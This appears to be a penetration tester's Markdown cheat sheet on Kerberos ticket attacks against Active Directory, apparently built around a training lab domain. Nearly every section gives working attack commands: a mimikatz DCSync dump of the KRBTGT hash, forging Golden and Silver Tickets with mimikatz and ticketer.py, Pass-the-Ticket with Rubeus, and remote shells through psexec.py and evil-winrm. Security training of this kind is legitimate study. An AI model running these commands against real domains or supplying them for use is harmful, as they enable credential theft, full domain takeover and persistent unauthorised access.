# Kerberos Ticket Attacks Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After gaining access to Kerberos environments, I expect to:

- [ ] Forge a **Golden Ticket** to impersonate any domain user (KRBTGT hash required)
- [ ] Forge a **Silver Ticket** to access specific services (service hash only)
- [ ] Use **Pass-the-Ticket** to reuse stolen Kerberos tickets (no password or hash needed)
- [ ] Abuse **TGT/TGS** operations for persistence and lateral movement
- [ ] Authenticate via **PEM/PFX certificates** in high-privilege accounts

---

## ‚úÖ Kerberos Ticket Attacks

### ü™ô Golden Ticket Attack

- Full domain compromise by forging TGT using KRBTGT hash

**üß† Requirements:**
- KRBTGT hash
- Domain SID
- User to impersonate
- Domain name

```powershell
# On Windows
Get-DomainSID
mimikatz "lsadump::dcsync /user:krbtgt /domain:inlanefreight.local" exit
kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974... /rc4:<krbtgt_hash> /ptt
Enter-PSSession dc01
```

```bash
# On Linux
lookupsid.py inlanefreight.local/user@dc01.inlanefreight.local
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain inlanefreight.local Administrator
export KRB5CCNAME=./Administrator.ccache
psexec.py -k -no-pass dc01.inlanefreight.local
```

---

### ü•à Silver Ticket Attack

- Targeted service access without Domain Controller communication

**üß† Requirements:**
- Any username
- Target service hash (e.g., CIFS, HTTP)
- Domain SID
- SPN (Service Principal Name)

```powershell
# On Windows
Get-DomainSID
kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21... /rc4:<service_hash> /target:sql01.inlanefreight.local /service:cifs /ptt
dir \\sql01.inlanefreight.local\c$
```

```bash
# On Linux
lookupsid.py inlanefreight.local/user@dc01.inlanefreight.local
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21... -domain inlanefreight.local -spn cifs/sql01.inlanefreight.local Administrator
export KRB5CCNAME=./Administrator.ccache
smbclient.py -k -no-pass sql01.inlanefreight.local
psexec.py -k -no-pass sql01.inlanefreight.local
```

---

### ü™™ Pass-the-Ticket (PTT)

- Reuse valid Kerberos tickets to gain access

```powershell
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe triage
klist
Rubeus.exe renew /ticket:<base64_ticket> /ptt
dir \\dc01\c$
```

---

### üé´ TGT & TGS Usage

```bash
# TGS-only access (requires .ccache)
export KRB5CCNAME=/path/to/john.ccache
psexec.py test.local/john@10.10.10.1 -k -no-pass
```

```bash
# TGT generation
KRB5CCNAME=out.ccache getnthash.py test.local/DC01\$ -key <aes256_key>
```

---

### üîê Certificate Authentication (PEM / PFX)

```bash
evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP
```

---

## üß† Quick Recap

- **Golden Ticket**: Grants full domain access using KRBTGT hash (full impersonation). Used for persistence and full control.
- **Silver Ticket**: Grants access to a specific service (CIFS, HTTP, etc.) using only that service‚Äôs hash.
- **Pass-the-Ticket**: Reuse dumped .kirbi or .ccache tickets to authenticate without credentials.
- **TGT/TGS**: Native Kerberos mechanisms abused for stealthy access or ticket renewal.
- **PEM/PFX Auth**: Certificate-based login for highly privileged accounts (certs often found in ADCS attacks).

---
